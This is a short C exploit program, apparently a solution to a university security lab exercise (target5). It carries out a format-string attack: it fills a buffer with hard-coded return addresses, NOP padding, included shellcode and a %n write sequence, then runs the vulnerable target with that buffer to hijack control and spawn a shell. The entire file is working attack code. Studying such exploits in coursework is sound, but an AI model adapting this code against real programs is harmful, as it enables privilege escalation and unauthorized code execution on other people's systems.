#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define NOP 0x90
#define BUFFER_SIZE 600
#define ADDRESS_SNIPPET "\x12\x12\x12\x12\xdc\xfb\xff\xbf\x11\x11\x11\x11\xdd\xfb\xff\xbf\x11\x11\x11\x11\xde\xfb\xff\xbf"
#define FORMAT_INJECT "%u%u%u%262u%n%410u%n%48389u%n"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[BUFFER_SIZE];

  //initialize the whole buffer space with NOP character
  memset(buf,NOP,BUFFER_SIZE);
  buf[BUFFER_SIZE-1]=0;

  //copy the address string into the buf, which is the parameter for the snprintf. "\x12"just occupy 1 byte means nothing
  memcpy(buf,ADDRESS_SNIPPET,strlen(ADDRESS_SNIPPET));

  //inject the shell code
  memcpy(buf+strlen(ADDRESS_SNIPPET),shellcode,strlen(shellcode));

  //the final format overflow part
  char *write=FORMAT_INJECT;
  memcpy(buf+strlen(ADDRESS_SNIPPET)+strlen(shellcode),FORMAT_INJECT,strlen(FORMAT_INJECT)); 
 
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}
